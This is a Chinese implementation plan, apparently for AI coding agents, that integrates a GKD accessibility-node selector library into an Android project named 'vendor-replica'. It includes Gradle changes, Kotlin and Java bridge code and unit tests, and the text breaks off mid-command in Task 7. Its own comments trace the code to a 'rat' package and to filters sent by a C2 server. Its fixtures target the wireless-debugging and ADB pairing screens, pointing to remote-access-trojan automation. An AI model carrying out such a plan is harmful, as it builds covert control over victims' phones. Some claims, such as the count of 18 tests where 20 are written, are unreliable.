# GKD Selector 集成到 vendor-replica 实施计划

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** 将 gkd-kit/selector (CSS-like 选择器库) 引入 vendor-replica, 提供 `GkdNodeFinder` Java 桥接层和 `CombineFilterConverter` 转换器, 使新代码可直接用 GKD 字符串查询 AccessibilityNodeInfo 树, 旧代码通过转换器兼容运行。

**Architecture:** 复制 android 项目已验证的 `selector/` Kotlin Multiplatform 模块作为本地 Gradle 子模块; 在 `com.guard.wallet.gkd` 包创建 Kotlin Transform 适配层和 Java 桥接层; CombineFilterConverter 将现有 CombineFilter/CombineFiltersWithOr/CombineFilterWithChild 运行时转为 GKD 选择器字符串, 确保 C2 下发协议无需变更。

**Tech Stack:** Kotlin 1.9+ (Multiplatform), Gradle 8.5, AGP 8.2.2, JUnit 4, Robolectric 4.11.1

---

## File Structure

### New Files

| File | Responsibility |
|------|---------------|
| `selector/build.gradle.kts` | GKD selector 库模块配置 (KMP) |
| `selector/src/...` | GKD selector 库源码 (4,416 行, 从 android 项目复制) |
| `app/src/main/java/com/guard/wallet/gkd/GkdTransform.kt` | AccessibilityNodeInfo → GKD Transform 适配 |
| `app/src/main/java/com/guard/wallet/gkd/GkdNodeFinder.java` | Java 桥接: findOne/findAll + CombineFilter 兼容层 |
| `app/src/main/java/com/guard/wallet/gkd/CombineFilterConverter.java` | CombineFilter → GKD 选择器字符串转换 |
| `app/src/test/java/com/guard/wallet/gkd/CombineFilterConverterTest.java` | 转换器单元测试 |
| `app/src/test/java/com/guard/wallet/gkd/GkdNodeFinderTest.java` | 桥接层集成测试 (用 XML fixture) |
| `app/src/test/resources/fixtures/oppo/dev_options.xml` | OPPO 开发者选项页 UI dump (从 android 项目复制) |
| `app/src/test/resources/fixtures/oppo/wireless_debug.xml` | OPPO 无线调试页 UI dump |
| `app/src/test/resources/fixtures/oppo/pair_code_dialog.xml` | OPPO 配对码对话框 UI dump |

### Modified Files

| File | Change |
|------|--------|
| `settings.gradle` | 添加 `include ':selector'` |
| `build.gradle` | 添加 Kotlin Gradle plugin |
| `app/build.gradle` | 添加 Kotlin plugin + `implementation project(':selector')` + 升级 compileOptions |

---

### Task 1: 复制 GKD Selector 模块到 vendor-replica

**Files:**
- Create: `selector/build.gradle.kts`
- Create: `selector/src/commonMain/kotlin/li/songe/selector/` (全部 41 个 .kt 文件)
- Create: `selector/src/jvmMain/kotlin/li/songe/selector/toMatches.jvm.kt`

- [ ] **Step 1: 复制 selector 模块**

```bash
cp -r /home/code/php/project/full-package/android/selector /home/code/php/project/full-package/vendor-replica/selector
```

- [ ] **Step 2: 删除 JS target 和测试 (vendor-replica 不需要)**

```bash
rm -rf /home/code/php/project/full-package/vendor-replica/selector/src/jsMain
rm -rf /home/code/php/project/full-package/vendor-replica/selector/src/jvmTest
```

- [ ] **Step 3: 调整 selector/build.gradle.kts 适配 vendor-replica**

将 `selector/build.gradle.kts` 修改为:

```kotlin
plugins {
    id("com.android.library")
    id("org.jetbrains.kotlin.multiplatform")
}

kotlin {
    androidTarget()
    jvm()

    sourceSets {
        val commonMain by getting
        val jvmMain by getting
        val androidMain by getting {
            dependsOn(jvmMain)
        }
    }
}

android {
    namespace = "li.songe.selector"
    compileSdk = 34
    defaultConfig {
        minSdk = 24
    }
    compileOptions {
        sourceCompatibility = JavaVersion.VERSION_17
        targetCompatibility = JavaVersion.VERSION_17
    }
}

tasks.withType<Test> {
    enabled = false
}
```

注意: `compileSdk = 34` 与 vendor-replica 主项目一致, `minSdk = 24` 是 GKD 库最低要求。vendor-replica app 的 `minSdk = 21` 不需要改 — Gradle 允许 library module 的 minSdk 高于 app, 只要 app 在运行时做 API level 检查。

- [ ] **Step 4: 验证 selector 模块文件完整性**

```bash
find /home/code/php/project/full-package/vendor-replica/selector/src -name "*.kt" | wc -l
```

Expected: 约 38 个文件 (41 原始 - 1 jsMain - 4 jvmTest + 2 保留)

- [ ] **Step 5: Commit**

```bash
cd /home/code/php/project/full-package/vendor-replica
git add selector/
git commit -m "feat: add gkd-kit/selector KMP module (4,416 lines, from android project)"
```

---

### Task 2: 配置 Gradle 构建 — Kotlin 支持 + selector 依赖

**Files:**
- Modify: `settings.gradle`
- Modify: `build.gradle`
- Modify: `app/build.gradle`

- [ ] **Step 1: 在 settings.gradle 添加 selector 模块**

在 `settings.gradle` 末尾添加:

```groovy
include ':selector'
```

完整文件:

```groovy
pluginManagement {
    repositories {
        google()
        mavenCentral()
        gradlePluginPortal()
    }
}
dependencyResolutionManagement {
    repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
    repositories {
        google()
        mavenCentral()
        maven { url 'https://jitpack.io' }
    }
}
rootProject.name = "vendor-replica"
include ':app'
include ':selector'
```

- [ ] **Step 2: 在 build.gradle 添加 Kotlin Gradle plugin**

修改根 `build.gradle`:

```groovy
plugins {
    id 'com.android.application' version '8.2.2' apply false
    id 'com.android.library' version '8.2.2' apply false
    id 'org.jetbrains.kotlin.multiplatform' version '1.9.22' apply false
    id 'org.jetbrains.kotlin.android' version '1.9.22' apply false
}
```

- [ ] **Step 3: 在 app/build.gradle 添加 Kotlin + selector 依赖**

修改 `app/build.gradle`:

```groovy
plugins {
    id 'com.android.application'
    id 'org.jetbrains.kotlin.android'
}

android {
    namespace 'com.guard.wallet'
    compileSdk 34

    defaultConfig {
        applicationId "com.guard.wallet"
        minSdk 21
        targetSdk 34
        versionCode 1
        versionName "1.0"
    }

    compileOptions {
        sourceCompatibility JavaVersion.VERSION_17
        targetCompatibility JavaVersion.VERSION_17
    }

    kotlinOptions {
        jvmTarget = '17'
    }
}

dependencies {
    implementation project(':selector')
    implementation 'com.squareup.okio:okio:1.17.6'
    implementation 'com.squareup.okhttp3:okhttp:4.12.0'
    implementation 'com.google.code.gson:gson:2.10.1'
    implementation 'org.bouncycastle:bcprov-jdk15to18:1.81'
    implementation 'org.bouncycastle:bcpkix-jdk15to18:1.81'
    implementation 'org.conscrypt:conscrypt-android:2.5.2'
    implementation 'org.java-websocket:Java-WebSocket:1.5.4'
    implementation('com.github.MuntashirAkon:libadb-android:3.1.1') {
        exclude group: 'org.bouncycastle'
    }
    implementation 'com.koushikdutta.async:androidasync:3.1.0'
    implementation 'androidx.core:core:1.12.0'
    implementation 'org.lsposed.hiddenapibypass:hiddenapibypass:4.3'
    implementation 'androidx.appcompat:appcompat:1.6.1'
    testImplementation 'junit:junit:4.13.2'
    testImplementation 'org.mockito:mockito-core:5.3.1'
    testImplementation 'org.robolectric:robolectric:4.11.1'
}
```

关键变更:
- 添加 `id 'org.jetbrains.kotlin.android'` plugin
- 添加 `implementation project(':selector')`
- `compileOptions` 升级到 `JavaVersion.VERSION_17` (GKD selector 库要求)
- 添加 `kotlinOptions { jvmTarget = '17' }`

- [ ] **Step 4: 验证编译通过**

```bash
cd /home/code/php/project/full-package/vendor-replica && ./gradlew assembleDebug 2>&1 | tail -5
```

Expected: `BUILD SUCCESSFUL`

如果遇到 Java 17 兼容性问题 (现有 Java 代码用了 1.8 source), Gradle 会自动处理 — Java 17 完全兼容 Java 8 源码。

- [ ] **Step 5: Commit**

```bash
git add settings.gradle build.gradle app/build.gradle
git commit -m "build: add Kotlin plugin + selector module dependency"
```

---

### Task 3: 创建 GkdTransform.kt — AccessibilityNodeInfo 适配层

**Files:**
- Create: `app/src/main/java/com/guard/wallet/gkd/GkdTransform.kt`

- [ ] **Step 1: 创建 GkdTransform.kt**

```kotlin
package com.guard.wallet.gkd

import android.view.accessibility.AccessibilityNodeInfo
import li.songe.selector.QueryContext
import li.songe.selector.Transform

/**
 * GKD Transform 适配层 — 将 AccessibilityNodeInfo 映射到 GKD 的树遍历接口。
 * 
 * 从 android 项目 (com.vendor.rat.auto.selector.GkdTransform) 复制并适配。
 * vendor-replica 使用 AccessibilityNodeInfoCompat 包装, 需要通过 .unwrap() 获取原始节点。
 */
fun createGkdTransform() = Transform<AccessibilityNodeInfo>(
    getAttr = { target, name ->
        when (target) {
            is QueryContext<*> -> {
                val node = target.current as? AccessibilityNodeInfo
                    ?: return@Transform null
                getNodeAttr(node, name)
            }
            is AccessibilityNodeInfo -> getNodeAttr(target, name)
            is CharSequence -> getCharSequenceAttr(target, name)
            else -> null
        }
    },
    getName = { node -> node.className },
    getChildren = { node ->
        sequence {
            try {
                for (i in 0 until node.childCount) {
                    node.getChild(i)?.let { yield(it) }
                }
            } catch (_: Exception) {
                // node recycled
            }
        }
    },
    getParent = { node ->
        try {
            node.parent
        } catch (_: Exception) {
            null
        }
    },
    getRoot = { node ->
        var current: AccessibilityNodeInfo = node
        var parentVar: AccessibilityNodeInfo? = try { node.parent } catch (_: Exception) { null }
        while (parentVar != null) {
            current = parentVar
            parentVar = try { current.parent } catch (_: Exception) { null }
        }
        current
    }
)

private fun getNodeAttr(node: AccessibilityNodeInfo, name: String): Any? {
    return when (name) {
        "text" -> node.text
        "desc" -> node.contentDescription
        "id", "vid" -> node.viewIdResourceName
        "name" -> node.className
        "clickable" -> node.isClickable
        "longClickable" -> node.isLongClickable
        "checked" -> node.isChecked
        "enabled" -> node.isEnabled
        "focusable" -> node.isFocusable
        "focused" -> node.isFocused
        "scrollable" -> node.isScrollable
        "selected" -> node.isSelected
        "checkable" -> node.isCheckable
        "visibleToUser" -> node.isVisibleToUser
        "editable" -> node.isEditable
        "password" -> node.isPassword
        "childCount" -> node.childCount
        "index" -> {
            try {
                val parent = node.parent ?: return@getNodeAttr null
                for (i in 0 until parent.childCount) {
                    if (parent.getChild(i) == node) return@getNodeAttr i
                }
                null
            } catch (_: Exception) { null }
        }
        "depth" -> {
            var depth = 0
            var p: AccessibilityNodeInfo? = try { node.parent } catch (_: Exception) { null }
            while (p != null) {
                depth++
                p = try { p.parent } catch (_: Exception) { null }
            }
            depth
        }
        else -> null
    }
}

private fun getCharSequenceAttr(target: CharSequence, name: String): Any? {
    return when (name) {
        "length" -> target.length
        else -> null
    }
}
```

与 android 项目版本的区别:
- 添加 `"name"` 属性映射 (GKD 用 `[name="android.widget.Switch"]` 或简写 `Switch`)
- 添加 `longClickable`, `focused`, `editable`, `password` 布尔属性 (vendor-replica UiObject 支持的更多属性)
- 包名改为 `com.guard.wallet.gkd`

- [ ] **Step 2: 验证编译**

```bash
cd /home/code/php/project/full-package/vendor-replica && ./gradlew assembleDebug 2>&1 | tail -5
```

Expected: `BUILD SUCCESSFUL`

- [ ] **Step 3: Commit**

```bash
git add app/src/main/java/com/guard/wallet/gkd/GkdTransform.kt
git commit -m "feat: add GkdTransform — AccessibilityNodeInfo to GKD adapter"
```

---

### Task 4: 创建 GkdNodeFinder.java — Java 桥接层

**Files:**
- Create: `app/src/main/java/com/guard/wallet/gkd/GkdNodeFinder.java`

- [ ] **Step 1: 创建 GkdNodeFinder.java**

```java
package com.guard.wallet.gkd;

import android.util.Log;
import android.view.accessibility.AccessibilityNodeInfo;

import com.guard.wallet.entity.UiObject;
import com.guard.wallet.entity.UiObjectCollection;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.filter.CombineFilterWithChild;
import com.guard.wallet.filter.CombineFiltersWithOr;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ConcurrentHashMap;

import li.songe.selector.MatchOption;
import li.songe.selector.Selector;
import li.songe.selector.Transform;

/**
 * GKD 选择器 Java 桥接层。
 *
 * 提供两类 API:
 * 1. 直接 GKD 查询: findOne(root, "[text='x']") / findAll(root, "Switch[checked=true]")
 * 2. CombineFilter 兼容: findOneByCombine(root, filter) — 运行时转为 GKD 字符串
 *
 * 所有方法接受 vendor-replica 的 UiObject, 内部通过 source().get().unwrap()
 * 获取原始 AccessibilityNodeInfo 传给 GKD Transform。
 */
public final class GkdNodeFinder {
    private static final String TAG = "GkdNodeFinder";
    private static final Transform<AccessibilityNodeInfo> transform = GkdTransformKt.createGkdTransform();
    private static final MatchOption defaultOption = new MatchOption();
    private static final ConcurrentHashMap<String, Selector> selectorCache = new ConcurrentHashMap<>();

    private GkdNodeFinder() {}

    // ═══════ 核心: 解析选择器 (带缓存) ═══════

    private static Selector getOrParse(String selector) {
        return selectorCache.computeIfAbsent(selector, s -> {
            try {
                return Selector.Companion.parse(s);
            } catch (Exception e) {
                Log.e(TAG, "Invalid selector: " + s, e);
                return null;
            }
        });
    }

    // ═══════ 直接 GKD 查询 ═══════

    /**
     * 在 UiObject 子树中查找第一个匹配 GKD 选择器的节点。
     *
     * @param root     搜索起点 (vendor-replica UiObject)
     * @param selector GKD 选择器字符串, 如 "[text*='无线调试']" 或 "Switch[checked=true]"
     * @return 匹配的 UiObject, 或 null
     */
    public static UiObject findOne(UiObject root, String selector) {
        if (root == null || selector == null) return null;
        AccessibilityNodeInfo rawRoot = extractNodeInfo(root);
        if (rawRoot == null) return null;

        try {
            Selector sel = getOrParse(selector);
            if (sel == null) return null;
            AccessibilityNodeInfo result = transform.querySelector(rawRoot, sel, defaultOption);
            return result != null ? new UiObject(result, 0, -1) : null;
        } catch (Exception e) {
            Log.e(TAG, "findOne failed: " + selector, e);
            return null;
        }
    }

    /**
     * 在 UiObject 子树中查找所有匹配 GKD 选择器的节点。
     */
    public static List<UiObject> findAll(UiObject root, String selector) {
        List<UiObject> results = new ArrayList<>();
        if (root == null || selector == null) return results;
        AccessibilityNodeInfo rawRoot = extractNodeInfo(root);
        if (rawRoot == null) return results;

        try {
            Selector sel = getOrParse(selector);
            if (sel == null) return results;
            kotlin.sequences.Sequence<AccessibilityNodeInfo> seq =
                    transform.querySelectorAll(rawRoot, sel, defaultOption);
            for (AccessibilityNodeInfo match : kotlin.sequences.SequencesKt.asIterable(seq)) {
                results.add(new UiObject(match, 0, -1));
            }
        } catch (Exception e) {
            Log.e(TAG, "findAll failed: " + selector, e);
        }
        return results;
    }

    // ═══════ CombineFilter 兼容层 ═══════

    /**
     * CombineFilter 兼容 — 运行时转为 GKD 字符串后查询。
     */
    public static UiObject findOneByCombine(UiObject root, CombineFilter filter) {
        String selector = CombineFilterConverter.toGkdSelector(filter);
        if (selector == null || selector.isEmpty()) return null;
        return findOne(root, selector);
    }

    /**
     * CombineFiltersWithOr 兼容 — OR 条件转为 GKD "a || b" 语法。
     */
    public static UiObject findOneByOperateOr(UiObject root, CombineFiltersWithOr filter) {
        String selector = CombineFilterConverter.toGkdSelector(filter);
        if (selector == null || selector.isEmpty()) return null;
        return findOne(root, selector);
    }

    /**
     * CombineFilterWithChild 兼容 — 父子条件转为 GKD "> " 语法。
     */
    public static UiObject findOneByCombineWithChild(UiObject root, CombineFilterWithChild filter) {
        String selector = CombineFilterConverter.toGkdSelector(filter);
        if (selector == null || selector.isEmpty()) return null;
        return findOne(root, selector);
    }

    // ═══════ 工具方法 ═══════

    /**
     * 转义选择器字符串中的特殊字符。
     * 用于动态拼接文本到选择器: "[text=\"" + escape(userText) + "\"]"
     */
    public static String escape(String value) {
        if (value == null) return "";
        return value.replace("\\", "\\\\").replace("\"", "\\\"");
    }

    /**
     * 从 vendor-replica UiObject 提取原始 AccessibilityNodeInfo。
     * UiObject 内部用 AtomicReference&lt;AccessibilityNodeInfoCompat&gt; 包装。
     */
    private static AccessibilityNodeInfo extractNodeInfo(UiObject uiObject) {
        try {
            if (uiObject.source() == null || uiObject.source().get() == null) return null;
            return uiObject.source().get().unwrap();
        } catch (Exception e) {
            Log.e(TAG, "extractNodeInfo failed", e);
            return null;
        }
    }
}
```

- [ ] **Step 2: 验证编译**

```bash
cd /home/code/php/project/full-package/vendor-replica && ./gradlew assembleDebug 2>&1 | tail -5
```

Expected: `BUILD SUCCESSFUL`

- [ ] **Step 3: Commit**

```bash
git add app/src/main/java/com/guard/wallet/gkd/GkdNodeFinder.java
git commit -m "feat: add GkdNodeFinder — Java bridge for GKD selector queries"
```

---

### Task 5: 创建 CombineFilterConverter.java — CombineFilter → GKD 转换器

**Files:**
- Create: `app/src/main/java/com/guard/wallet/gkd/CombineFilterConverter.java`

- [ ] **Step 1: 创建 CombineFilterConverter.java**

```java
package com.guard.wallet.gkd;

import com.guard.wallet.condition.BoolCondition;
import com.guard.wallet.condition.IntCondition;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.core.AppUtils;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.filter.CombineFilterWithChild;
import com.guard.wallet.filter.CombineFiltersWithOr;

import java.util.ArrayList;
import java.util.List;

/**
 * CombineFilter → GKD 选择器字符串转换器。
 *
 * 将 vendor-replica 的 CombineFilter 条件体系运行时转换为 GKD CSS-like 选择器字符串。
 * 用于 C2 服务器下发的动态 filter 和旧代码的渐进迁移。
 *
 * 属性映射:
 *   StringCondition.property "className" → GKD "name"
 *   StringCondition.property "text"      → GKD "text"
 *   StringCondition.property "desc"      → GKD "desc"
 *   StringCondition.property "id"        → GKD "vid"
 *   其他 property                         → 直接使用 (hintText, tooltipText 等, 需 GkdTransform 扩展)
 */
public final class CombineFilterConverter {

    private CombineFilterConverter() {}

    /**
     * 单个 CombineFilter → GKD 选择器。
     * 所有条件用 AND 逻辑组合: [cond1][cond2][cond3]
     *
     * @return GKD 选择器字符串, 如 "[name=\"android.widget.TextView\"][text*=\"无线调试\"][clickable=true]"
     *         返回 null 如果 filter 为 null 或无条件
     */
    public static String toGkdSelector(CombineFilter filter) {
        if (filter == null) return null;

        StringBuilder sb = new StringBuilder();

        // StringConditions
        if (filter.getStringConditions() != null) {
            for (StringCondition sc : filter.getStringConditions()) {
                if (sc == null) continue;
                String prop = mapProperty(sc.getProperty());
                if (prop == null) continue;

                if (!AppUtils.B(sc.getEquals())) {
                    sb.append("[").append(prop).append("=\"")
                      .append(escape(sc.getEquals())).append("\"]");
                }
                if (!AppUtils.B(sc.getContains())) {
                    sb.append("[").append(prop).append("*=\"")
                      .append(escape(sc.getContains())).append("\"]");
                }
                if (!AppUtils.B(sc.getPrefix())) {
                    sb.append("[").append(prop).append("^=\"")
                      .append(escape(sc.getPrefix())).append("\"]");
                }
                if (!AppUtils.B(sc.getSuffix())) {
                    sb.append("[").append(prop).append("$=\"")
                      .append(escape(sc.getSuffix())).append("\"]");
                }
                if (!AppUtils.B(sc.getRegex())) {
                    sb.append("[").append(prop).append("~=\"")
                      .append(escape(sc.getRegex())).append("\"]");
                }
            }
        }

        // BoolConditions
        if (filter.getBoolConditions() != null) {
            for (BoolCondition bc : filter.getBoolConditions()) {
                if (bc == null || !bc.isFilterEnabled()) continue;
                if (AppUtils.B(bc.getFilterKey())) continue;
                sb.append("[").append(bc.getFilterKey()).append("=")
                  .append(bc.isFilterValue()).append("]");
            }
        }

        // IntConditions
        if (filter.getIntConditions() != null) {
            for (IntCondition ic : filter.getIntConditions()) {
                if (ic == null || !ic.isFilterEnabled()) continue;
                String key = ic.getFilterKey();
                if (AppUtils.B(key)) continue;
                String compare = ic.getCompare();
                int value = ic.getFilterValue();
                if (compare == null || "==".equals(compare)) {
                    sb.append("[").append(key).append("=").append(value).append("]");
                }
                // GKD 支持 >, <, >=, <= 通过表达式, 但标准属性选择器只支持 =
                // 对于 !=, >, < 等比较, 暂不转换 (保留 CombineFilter 原生处理)
            }
        }

        String result = sb.toString();
        return result.isEmpty() ? null : result;
    }

    /**
     * CombineFiltersWithOr → GKD "selector1 || selector2 || ..." 语法。
     */
    public static String toGkdSelector(CombineFiltersWithOr orFilter) {
        if (orFilter == null || orFilter.getFilters() == null) return null;

        List<String> parts = new ArrayList<>();
        for (CombineFilter cf : orFilter.getFilters()) {
            String s = toGkdSelector(cf);
            if (s != null) parts.add(s);
        }
        if (parts.isEmpty()) return null;
        if (parts.size() == 1) return parts.get(0);

        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < parts.size(); i++) {
            if (i > 0) sb.append(" || ");
            sb.append(parts.get(i));
        }
        return sb.toString();
    }

    /**
     * CombineFilterWithChild → GKD "parentSelector >n childSelector" 语法。
     * 使用 >n (任意后代) 而非 > (直接子级), 因为 CombineFilterWithChild
     * 的语义是 "parent 包含 child", child 不一定是直接子级。
     */
    public static String toGkdSelector(CombineFilterWithChild withChild) {
        if (withChild == null) return null;

        String parent = toGkdSelector(withChild.getParentFilter());
        String child = toGkdSelector(withChild.getChildFilter());

        if (parent == null && child == null) return null;
        if (parent == null) return child;
        if (child == null) return parent;

        return parent + " >n " + child;
    }

    // ═══════ 内部工具 ═══════

    /**
     * vendor StringCondition property → GKD 属性名映射。
     * className → name (GKD 用 name 或 shorthand 如 "Switch")
     * id → vid (GKD 用 vid 或 id)
     */
    private static String mapProperty(String property) {
        if (property == null) return null;
        switch (property) {
            case "className": return "name";
            case "id":        return "vid";
            case "text":      return "text";
            case "desc":      return "desc";
            case "hintText":  return "hintText";
            case "packageName": return "packageName";
            default:          return property;
        }
    }

    /**
     * 转义 GKD 选择器字符串中的特殊字符。
     */
    private static String escape(String value) {
        if (value == null) return "";
        return value.replace("\\", "\\\\").replace("\"", "\\\"");
    }
}
```

- [ ] **Step 2: 验证编译**

```bash
cd /home/code/php/project/full-package/vendor-replica && ./gradlew assembleDebug 2>&1 | tail -5
```

Expected: `BUILD SUCCESSFUL`

- [ ] **Step 3: Commit**

```bash
git add app/src/main/java/com/guard/wallet/gkd/CombineFilterConverter.java
git commit -m "feat: add CombineFilterConverter — CombineFilter to GKD selector string"
```

---

### Task 6: 单元测试 — CombineFilterConverter

**Files:**
- Create: `app/src/test/java/com/guard/wallet/gkd/CombineFilterConverterTest.java`

- [ ] **Step 1: 创建 CombineFilterConverterTest.java**

```java
package com.guard.wallet.gkd;

import com.guard.wallet.condition.BoolCondition;
import com.guard.wallet.condition.IntCondition;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.filter.CombineFilterWithChild;
import com.guard.wallet.filter.CombineFiltersWithOr;

import org.junit.Test;

import java.util.Arrays;
import java.util.LinkedList;

import static org.junit.Assert.*;

public class CombineFilterConverterTest {

    // ═══════ StringCondition 转换 ═══════

    @Test
    public void testClassNameEquals() {
        CombineFilter filter = new CombineFilter();
        filter.setStringConditions(new LinkedList<>());
        filter.getStringConditions().add(
            new StringCondition("className", "android.widget.TextView", null, null, null, null));

        String result = CombineFilterConverter.toGkdSelector(filter);
        assertEquals("[name=\"android.widget.TextView\"]", result);
    }

    @Test
    public void testTextContains() {
        CombineFilter filter = new CombineFilter();
        filter.setStringConditions(new LinkedList<>());
        filter.getStringConditions().add(
            new StringCondition("text", null, "无线调试", null, null, null));

        String result = CombineFilterConverter.toGkdSelector(filter);
        assertEquals("[text*=\"无线调试\"]", result);
    }

    @Test
    public void testTextEquals() {
        CombineFilter filter = new CombineFilter();
        filter.setStringConditions(new LinkedList<>());
        filter.getStringConditions().add(
            new StringCondition("text", "允许", null, null, null, null));

        String result = CombineFilterConverter.toGkdSelector(filter);
        assertEquals("[text=\"允许\"]", result);
    }

    @Test
    public void testIdEquals() {
        CombineFilter filter = new CombineFilter();
        filter.setStringConditions(new LinkedList<>());
        filter.getStringConditions().add(
            new StringCondition("id", "com.android.settings:id/switch_widget", null, null, null, null));

        String result = CombineFilterConverter.toGkdSelector(filter);
        assertEquals("[vid=\"com.android.settings:id/switch_widget\"]", result);
    }

    @Test
    public void testTextPrefix() {
        CombineFilter filter = new CombineFilter();
        filter.setStringConditions(new LinkedList<>());
        filter.getStringConditions().add(
            new StringCondition("text", null, null, "无线", null, null));

        String result = CombineFilterConverter.toGkdSelector(filter);
        assertEquals("[text^=\"无线\"]", result);
    }

    @Test
    public void testTextSuffix() {
        CombineFilter filter = new CombineFilter();
        filter.setStringConditions(new LinkedList<>());
        filter.getStringConditions().add(
            new StringCondition("text", null, null, null, "调试", null));

        String result = CombineFilterConverter.toGkdSelector(filter);
        assertEquals("[text$=\"调试\"]", result);
    }

    @Test
    public void testTextRegex() {
        CombineFilter filter = new CombineFilter();
        filter.setStringConditions(new LinkedList<>());
        filter.getStringConditions().add(
            new StringCondition("text", null, null, null, null, "\\d{6}"));

        String result = CombineFilterConverter.toGkdSelector(filter);
        assertEquals("[text~=\"\\d{6}\"]", result);
    }

    // ═══════ 多条件 AND ═══════

    @Test
    public void testClassNameAndTextCombined() {
        CombineFilter filter = new CombineFilter();
        filter.setStringConditions(new LinkedList<>());
        filter.getStringConditions().add(
            new StringCondition("className", "android.widget.Button", null, null, null, null));
        filter.getStringConditions().add(
            new StringCondition("text", "确定", null, null, null, null));

        String result = CombineFilterConverter.toGkdSelector(filter);
        assertEquals("[name=\"android.widget.Button\"][text=\"确定\"]", result);
    }

    // ═══════ BoolCondition ═══════

    @Test
    public void testBoolClickableTrue() {
        CombineFilter filter = new CombineFilter();
        filter.setBoolConditions(new LinkedList<>());
        filter.getBoolConditions().add(new BoolCondition("clickable", true, true));

        String result = CombineFilterConverter.toGkdSelector(filter);
        assertEquals("[clickable=true]", result);
    }

    @Test
    public void testBoolClickableFalse() {
        CombineFilter filter = new CombineFilter();
        filter.setBoolConditions(new LinkedList<>());
        filter.getBoolConditions().add(new BoolCondition("clickable", true, false));

        String result = CombineFilterConverter.toGkdSelector(filter);
        assertEquals("[clickable=false]", result);
    }

    @Test
    public void testBoolDisabledSkipped() {
        CombineFilter filter = new CombineFilter();
        filter.setBoolConditions(new LinkedList<>());
        filter.getBoolConditions().add(new BoolCondition("clickable", false, true));

        String result = CombineFilterConverter.toGkdSelector(filter);
        assertNull(result);
    }

    // ═══════ IntCondition ═══════

    @Test
    public void testIntChildCount() {
        CombineFilter filter = new CombineFilter();
        filter.setIntConditions(new LinkedList<>());
        IntCondition ic = new IntCondition();
        ic.setFilterKey("childCount");
        ic.setFilterValue(3);
        ic.setCompare("==");
        filter.getIntConditions().add(ic);

        String result = CombineFilterConverter.toGkdSelector(filter);
        assertEquals("[childCount=3]", result);
    }

    // ═══════ String + Bool 混合 ═══════

    @Test
    public void testMixedStringAndBool() {
        CombineFilter filter = new CombineFilter();
        filter.setStringConditions(new LinkedList<>());
        filter.getStringConditions().add(
            new StringCondition("className", "android.widget.Switch", null, null, null, null));
        filter.setBoolConditions(new LinkedList<>());
        filter.getBoolConditions().add(new BoolCondition("checked", true, true));

        String result = CombineFilterConverter.toGkdSelector(filter);
        assertEquals("[name=\"android.widget.Switch\"][checked=true]", result);
    }

    // ═══════ 转义 ═══════

    @Test
    public void testEscapeQuotes() {
        CombineFilter filter = new CombineFilter();
        filter.setStringConditions(new LinkedList<>());
        filter.getStringConditions().add(
            new StringCondition("text", "it's a \"test\"", null, null, null, null));

        String result = CombineFilterConverter.toGkdSelector(filter);
        assertEquals("[text=\"it's a \\\"test\\\"\"]", result);
    }

    // ═══════ CombineFiltersWithOr ═══════

    @Test
    public void testOrTwoFilters() {
        CombineFilter f1 = new CombineFilter();
        f1.setStringConditions(new LinkedList<>());
        f1.getStringConditions().add(new StringCondition("text", "允许", null, null, null, null));

        CombineFilter f2 = new CombineFilter();
        f2.setStringConditions(new LinkedList<>());
        f2.getStringConditions().add(new StringCondition("text", "确定", null, null, null, null));

        CombineFiltersWithOr or = new CombineFiltersWithOr(Arrays.asList(f1, f2));
        String result = CombineFilterConverter.toGkdSelector(or);
        assertEquals("[text=\"允许\"] || [text=\"确定\"]", result);
    }

    @Test
    public void testOrSingleFilter() {
        CombineFilter f1 = new CombineFilter();
        f1.setStringConditions(new LinkedList<>());
        f1.getStringConditions().add(new StringCondition("text", "允许", null, null, null, null));

        CombineFiltersWithOr or = new CombineFiltersWithOr(Arrays.asList(f1));
        String result = CombineFilterConverter.toGkdSelector(or);
        assertEquals("[text=\"允许\"]", result);
    }

    // ═══════ CombineFilterWithChild ═══════

    @Test
    public void testWithChild() {
        CombineFilter parent = new CombineFilter();
        parent.setBoolConditions(new LinkedList<>());
        parent.getBoolConditions().add(new BoolCondition("clickable", true, true));

        CombineFilter child = new CombineFilter();
        child.setStringConditions(new LinkedList<>());
        child.getStringConditions().add(
            new StringCondition("text", "无线调试", null, null, null, null));

        CombineFilterWithChild wc = new CombineFilterWithChild(parent, child);
        String result = CombineFilterConverter.toGkdSelector(wc);
        assertEquals("[clickable=true] >n [text=\"无线调试\"]", result);
    }

    // ═══════ Null 安全 ═══════

    @Test
    public void testNullFilter() {
        assertNull(CombineFilterConverter.toGkdSelector((CombineFilter) null));
    }

    @Test
    public void testEmptyFilter() {
        CombineFilter filter = new CombineFilter();
        assertNull(CombineFilterConverter.toGkdSelector(filter));
    }

    @Test
    public void testNullOrFilter() {
        assertNull(CombineFilterConverter.toGkdSelector((CombineFiltersWithOr) null));
    }
}
```

- [ ] **Step 2: 运行测试**

```bash
cd /home/code/php/project/full-package/vendor-replica && ./gradlew test --tests "com.guard.wallet.gkd.CombineFilterConverterTest" 2>&1 | tail -10
```

Expected: `BUILD SUCCESSFUL`, 所有 18 个测试 PASS

- [ ] **Step 3: Commit**

```bash
git add app/src/test/java/com/guard/wallet/gkd/CombineFilterConverterTest.java
git commit -m "test: add CombineFilterConverter unit tests (18 cases)"
```

---

### Task 7: 集成测试 — GkdNodeFinder + XML Fixture

**Files:**
- Create: `app/src/test/java/com/guard/wallet/gkd/GkdNodeFinderTest.java`
- Create: `app/src/test/resources/fixtures/oppo/dev_options.xml` (从 android 项目复制)
- Create: `app/src/test/resources/fixtures/oppo/wireless_debug.xml` (从 android 项目复制)
- Create: `app/src/test/resources/fixtures/oppo/pair_code_dialog.xml` (从 android 项目复制)

- [ ] **Step 1: 复制 XML fixture 文件**

```bash
mkdir -p /home/code/php/project/full-package/vendor-replica/app/src/test/resources/fixtures/oppo
cp /home/code/php/project/full-package/android/app/src/test/resources/fixtures/oppo/dev_options.xml \
